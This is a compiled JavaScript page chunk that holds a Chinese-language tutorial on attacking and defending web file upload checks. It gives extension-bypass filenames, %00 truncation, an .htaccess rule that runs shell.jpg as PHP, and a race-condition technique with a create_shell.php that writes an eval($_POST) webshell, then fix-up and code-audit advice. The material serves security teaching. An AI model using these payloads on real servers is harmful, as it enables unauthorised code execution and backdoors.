(window.webpackJsonp=window.webpackJsonp||[]).push([[78],{781:function(s,t,a){"use strict";a.r(t);var n=a(102),p=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"客户端校验"}},[s._v("客户端校验 "),a("a",{staticClass:"header-anchor",attrs:{href:"#客户端校验"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("检测")])]),s._v(" "),a("p",[s._v("Javascript校验后缀名（一般只校验后缀名）")]),s._v(" "),a("p",[a("strong",[s._v("绕过")])]),s._v(" "),a("p",[s._v("开Burp代理，随便点击浏览“”选择文件，但是还没点击“上传”，就弹出警告框，说明流量没经过burp代理；所以非常可能是客户端JavaScript检测。")]),s._v(" "),a("p",[s._v("直接把木马改成"),a("code",[s._v(".gif")]),s._v("后缀上传，BurpSuite拦包修改后缀名")]),s._v(" "),a("h2",{attrs:{id:"服务端校验"}},[s._v("服务端校验 "),a("a",{staticClass:"header-anchor",attrs:{href:"#服务端校验"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("校验")])]),s._v(" "),a("ol",[a("li",[a("p",[s._v("MIME检测 文件头content-type字段校验（image/gif）")])]),s._v(" "),a("li",[a("p",[s._v("文件内容头校验（GIF89a）")])]),s._v(" "),a("li",[a("p",[s._v("文件扩展名校验  (白名单、黑名单)")])]),s._v(" "),a("li",[a("p",[s._v("文件内容检测 (检测内容是否合法或含有恶意代码)")])])]),s._v(" "),a("p",[a("strong",[s._v("绕过")])]),s._v(" "),a("p",[s._v("前两种校验，在恶意脚本前添加GIF89a标识，一句话前后加图片数据混淆；直接把木马改成"),a("code",[s._v(".gif")]),s._v("后缀上传，BurpSuite拦包修改后缀名。")]),s._v(" "),a("p",[a("strong",[s._v("黑名单绕过：")])]),s._v(" "),a("p",[s._v("找漏网之鱼："),a("code",[s._v("cer、php3、php4")]),s._v("等")]),s._v(" "),a("p",[s._v("大小写绕过："),a("code",[s._v("AsP、pHP")])]),s._v(" "),a("p",[s._v("文件后缀复写绕过："),a("code",[s._v(".phphpp")])]),s._v(" "),a("p",[s._v("针对Windows系统：")]),s._v(" "),a("p",[s._v("上传不符合windows文件命名规则的文件名")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("test.php:1.jpg\ntest.php::$DATA\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("会被windows系统自动去掉不符合规则符号后面的内容")]),s._v(" "),a("p",[s._v("会被windows系统自动去掉不符合规则符号后面的内容")]),s._v(" "),a("p",[a("strong",[s._v("白名单绕过：")])]),s._v(" "),a("blockquote",[a("p",[s._v("%00截断 (PHP<5.3.4时 shell.php%00.jpg 可截断%00后的内容)\n配合服务器中间件解析漏洞绕过")])]),s._v(" "),a("p",[s._v("黑白名单通用，如果可上传修改 "),a("code",[s._v(".htaccess")]),s._v(" 文件 (还能用于隐藏后门)")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("FilesMatch "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"shell.jpg"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n SetHandler application"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("x"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("httpd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("php\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("FilesMatch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//上传shell.jpg文件，将解析为php运行")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("strong",[s._v("文件加载检测(文件内容检测)")])]),s._v(" "),a("p",[s._v("常见的是对图像进行二次渲染，一般是调用PHP 的GD库")]),s._v(" "),a("p",[s._v("一个绕过GD库的Webshell生成器：")]),s._v(" "),a("p",[s._v("http://wiki.ioin.in/soft/detail/1q")]),s._v(" "),a("p",[s._v("https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE")]),s._v(" "),a("h2",{attrs:{id:"竞争条件攻击"}},[s._v("竞争条件攻击 "),a("a",{staticClass:"header-anchor",attrs:{href:"#竞争条件攻击"}},[s._v("#")])]),s._v(" "),a("p",[s._v("一些网站允许上传任意文件，然后检测文件是否包含Webshell，如果有则删除该文件。")]),s._v(" "),a("blockquote",[a("p",[s._v("服务器端在处理不同用户的请求时是并发进行的")]),s._v(" "),a("p",[s._v("如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞")])]),s._v(" "),a("p",[s._v("如这样一段代码")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'src'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("copy")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'src'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'dst'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sleep")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\t\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unlink")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'dst'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("它先把文件保存在本地，再检查，然后删除")]),s._v(" "),a("p",[s._v("在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件")]),s._v(" "),a("p",[s._v("该文件就会被执行从而生成一个恶意shell")]),s._v(" "),a("p",[a("strong",[s._v("竞争删除前生成shell流程：")])]),s._v(" "),a("blockquote",[a("p",[s._v("上传文件→访问执行文件，生成shell文件→删除不安全文件 \t(多线程访问)")])]),s._v(" "),a("p",[a("strong",[s._v("create_shell.php")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fputs")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fopen")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'../shell.php'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'w'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'<?php @eval($_POST[123]) ?>'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("strong",[s._v("防御方案：")])]),s._v(" "),a("p",[s._v("对于文件上传，在将文件保存在本地前就进行相应的安全检查")]),s._v(" "),a("h2",{attrs:{id:"修复建议"}},[s._v("修复建议 "),a("a",{staticClass:"header-anchor",attrs:{href:"#修复建议"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("1、使用白名单限制可以上传的文件扩展名")]),s._v(" "),a("p",[s._v("2、注意0x00截断攻击（PHP更新到最新版本）")]),s._v(" "),a("p",[s._v("3、对上传后的文件统一随机命名，不允许用户控制扩展名")]),s._v(" "),a("p",[s._v("4、上传文件的存储目录禁用执行权限")])]),s._v(" "),a("p",[a("strong",[s._v("代码审计中关注以下函数")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("move_uploaded_file")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//将上传的文件移动到新位置")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("全局搜索"),a("code",[s._v("$_FILES")]),s._v("变量，定位到相关的上传过程查看过滤是否严格。")])])}),[],!1,null,null,null);t.default=p.exports}}]);